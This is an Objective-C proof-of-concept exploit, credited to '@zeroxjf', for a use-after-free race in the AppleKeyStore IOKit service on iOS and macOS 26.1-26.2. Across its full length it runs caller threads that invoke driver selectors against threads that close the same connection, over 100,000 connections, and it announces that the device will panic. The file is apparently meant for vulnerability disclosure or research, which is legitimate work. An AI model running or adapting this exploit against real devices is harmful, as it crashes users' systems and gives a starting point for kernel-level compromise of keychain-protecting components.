// AppleSEPKeyStore UAF Race PoC
// Author: @zeroxjf
// Target: iOS 26.1-26.2, macOS 26.1-26.2

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdio.h>
#import <unistd.h>

#define AKS_SERVICE_NAME "AppleKeyStore"
#define NUM_CALLERS 8
#define NUM_CLOSERS 4
#define NUM_ITERATIONS 100000

static _Atomic(io_connect_t) g_conn = IO_OBJECT_NULL;
static atomic_bool g_done = false;
static atomic_uint g_calls = 0;
static atomic_uint g_closes = 0;

static void *caller_thread(void *arg) {
    uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};

    while (!atomic_load(&g_done)) {
        io_connect_t conn = atomic_load(&g_conn);
        if (conn == IO_OBJECT_NULL) continue;

        for (uint32_t sel = 0; sel < 16; sel++) {
            IOConnectCallMethod(conn, sel, scalars, 6, NULL, 0, NULL, NULL, NULL, NULL);
            atomic_fetch_add(&g_calls, 1);
        }
    }
    return NULL;
}

static void *closer_thread(void *arg) {
    while (!atomic_load(&g_done)) {
        io_connect_t conn = atomic_load(&g_conn);
        if (conn == IO_OBJECT_NULL) continue;

        IOServiceClose(conn);
        atomic_store(&g_conn, IO_OBJECT_NULL);
        atomic_fetch_add(&g_closes, 1);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        printf("========================================\n");
        printf("  AppleSEPKeyStore UAF Race PoC\n");
        printf("  Author: @zeroxjf\n");
        printf("========================================\n\n");

        printf("Target: iOS/macOS 26.1-26.2\n");
        printf("Method: %d callers + %d closers racing\n", NUM_CALLERS, NUM_CLOSERS);
        printf("Iterations: %d connections\n", NUM_ITERATIONS);
        printf("Client types: 0x2022, 0xbeef, 0x1337, 0x4141\n\n");

        mach_port_t master_port = MACH_PORT_NULL;
        IOMainPort(MACH_PORT_NULL, &master_port);

        io_service_t svc = IOServiceGetMatchingService(master_port, IOServiceMatching(AKS_SERVICE_NAME));
        if (svc == IO_OBJECT_NULL) {
            printf("ERROR: AppleKeyStore service not found\n");
            return 1;
        }
        printf("[+] AppleKeyStore service found\n");

        pthread_t callers[NUM_CALLERS];
        pthread_t closers[NUM_CLOSERS];

        for (int i = 0; i < NUM_CALLERS; i++) {
            pthread_create(&callers[i], NULL, caller_thread, NULL);
        }
        for (int i = 0; i < NUM_CLOSERS; i++) {
            pthread_create(&closers[i], NULL, closer_thread, NULL);
        }

        printf("[+] Spawned %d callers + %d closers\n", NUM_CALLERS, NUM_CLOSERS);
        printf("[!] Starting %d connections - device WILL panic\n\n", NUM_ITERATIONS);

        for (int i = 0; i < NUM_ITERATIONS; i++) {
            uint32_t type = (i % 4 == 0) ? 0x2022 :
                            (i % 4 == 1) ? 0xbeef :
                            (i % 4 == 2) ? 0x1337 : 0x4141;

            io_connect_t conn = IO_OBJECT_NULL;
            IOServiceOpen(svc, mach_task_self(), type, &conn);
            atomic_store(&g_conn, conn);

            if ((i + 1) % 10000 == 0) {
                printf("[%6d/%d] calls=%u closes=%u\n",
                       i + 1, NUM_ITERATIONS,
                       atomic_load(&g_calls),
                       atomic_load(&g_closes));
            }
        }

        atomic_store(&g_done, true);

        for (int i = 0; i < NUM_CALLERS; i++) {
            pthread_join(callers[i], NULL);
        }
        for (int i = 0; i < NUM_CLOSERS; i++) {
            pthread_join(closers[i], NULL);
        }

        io_connect_t final_conn = atomic_load(&g_conn);
        if (final_conn != IO_OBJECT_NULL) {
            IOServiceClose(final_conn);
        }
        IOObjectRelease(svc);

        printf("\n========================================\n");
        printf("Finished - if you see this, no panic occurred\n");
        printf("Total: calls=%u closes=%u\n", atomic_load(&g_calls), atomic_load(&g_closes));
        printf("========================================\n");
    }
    return 0;
}
